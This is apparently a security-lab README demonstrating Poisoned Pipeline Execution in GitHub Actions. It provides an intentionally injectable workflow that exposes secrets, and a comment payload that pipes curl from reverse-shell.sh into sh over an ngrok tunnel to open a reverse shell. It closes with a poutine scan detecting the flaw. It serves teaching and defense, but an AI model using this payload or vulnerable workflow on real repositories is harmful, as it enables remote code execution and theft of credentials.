# Github Actions: Poisoned Pipeline Execution


This folder showcases an attack against a GitHub Action Pipeline vulnerable to [*PPE*](https://github.com/R3DRUN3/sploitcraft/tree/main/ci-cd/ppe).  
For a complete hacking lab leveraging PPE as the attack's entry point, take a look at [*this*](../../../labs/pipes-to-cloud/).   


### Demo Objective 

The objective of this demo is to illustrate how an attacker can exploit a vulnerable GitHub Action setup to:

- Execute remote code.

- Exfiltrate sensitive secrets from the GitHub runner environment.

## Prerequisites 

To run this demo, ensure you have:

- Access to a GitHub repository with GitHub Actions enabled.


## Instructions 
 
1. **Repo Creation** : Create a new Github repo and add some github action's secrets (eg `AWS_API_KEY`, `MYSQL_CONNECTION_STRING` and `GENERIC_TOKEN`)  
 
2. **Configuration** : Inside the new repo, create the `.github/workflows` folder.
 
3. **Action Manifest** : Inside the workflow folder, create a yaml file called `vulnerable.yaml` and copy the following manifest inside:  
```yaml
name: command-injection-demo
on:
  issue_comment:
    types: [created]
jobs:
  auto-manage-new-issue:
    runs-on: ubuntu-latest
    steps:
      - name: Retrieve Issue Information
        run: |
          echo ${{ github.event.comment.body }}
        env:
          AWS_API_KEY: ${{ secrets.AWS_API_KEY }}
          MYSQL_CONNECTION_STRING: ${{ secrets.MYSQL_CONNECTION_STRING }}
          GENERIC_TOKEN: ${{ secrets.GENERIC_TOKEN }}
```  

This GitHub Action workflow (`command-injection-demo`) triggers on the creation of new comments inside an issue.  
Upon activation, it retrieves the body of the comment (`${{ github.event.comment.body }}`) and echoes it directly within the workflow execution environment.  
The vulnerability lies in the lack of input sanitization for `${{ github.event.comment.body }}`.  
Since the workflow echoes this variable without any validation or sanitization, an attacker can potentially pipe and inject arbitrary operating system commands into the workflow.  
By crafting a malicious comment, an attacker could exploit this vulnerability to execute unauthorized commands within the GitHub Actions environment and exfiltrate the secrets (`AWS_API_KEY`, `MYSQL_CONNECTION_STRING` and `GENERIC_TOKEN`).  


 
4. **Exploit** : Create a new issue and add a new comment to it, see what happens:  

![legit-comment](./images/legit_issue_comment.png)  
![legit-action-run](./images/legit_action_run.png)   
 
As you can see the action was triggered by our comment and printed out the body of the comment.  

At this point we can proceed to poison the execution 😈

In order to do that we will use [*ngrok*](https://ngrok.com/) (you can also use [*Cloudflare Tunnels*](https://www.cloudflare.com/products/tunnel/) or whatever tool fit the need to seamlessy expose a local service to the internet).  


Open a new nectcat listener on your local machine:  
```sh
nc -lnvp 1337
```  

Forward an ngrok tcp tunnel on the same port: 

```sh
ngrok tcp 1337
```  

Now, retrieve the `Forwarding` address (DNS name) from ngrok output and with that we can construct our malicious payload (you can also use ngrok public IP instead of the dns name).  

Our payload will be:  
```console
"" && sh -c 'curl https://reverse-shell.sh/<NGROK-IP-OR-DNS-NAME>:<NGROK-PUBLIC-PORT> | sh'
```  


This payload will be the body of our new malicious comment on the GitHub issue:  
![payload](./images/ppe_payload.png)  

When we leave this comment, it will trigger the GitHub Action, and that payload will be injected directly into the runner (agent) of the action and executed, thereby opening a reverse shell within the remote environment of the pipeline.    
From there, we will have the ability to exfiltrate secrets.    
Watch a demonstration of the entire workflow in the following video:  


https://github.com/R3DRUN3/sploitcraft/assets/102741679/ffd8696e-1271-469e-9629-38c3b087f28c  

</br>

We can inspect repositories to find possible misconfiguration leading to PPE with [poutine](https://github.com/boostsecurityio/poutine) (or other tools mentioned [here](https://github.com/myugan/awesome-cicd-security?tab=readme-ov-file#tools)):  

```console
docker run -e GH_TOKEN ghcr.io/boostsecurityio/poutine:latest analyze_repo r3drun3/vuln

Rule: Injection with Arbitrary External Contributor Input
Severity: warning
Description: The pipeline contains an injection into bash or JavaScript with an expression 
that can contain user input. Prefer placing the expression in an environment variable 
instead of interpolating it directly into a script.
Documentation: https://boostsecurityio.github.io/poutine/rules/injection

+--------------+--------------------------------+----------------------------------------------------------------------------+
|  REPOSITORY  |            DETAILS             |                                    URL                                     |
+--------------+--------------------------------+----------------------------------------------------------------------------+
| r3drun3/vuln | .github/workflows/issue.yaml   | https://github.com/r3drun3/vuln/tree/HEAD/.github/workflows/issue.yaml#L10 |
|              | Job: auto-manage-new-issue     |                                                                            |
|              | Step: 0                        |                                                                            |
|              | Sources:                       |                                                                            |
|              | github.event.comment.body      |                                                                            |
|              |                                |                                                                            |
+--------------+--------------------------------+----------------------------------------------------------------------------+
```










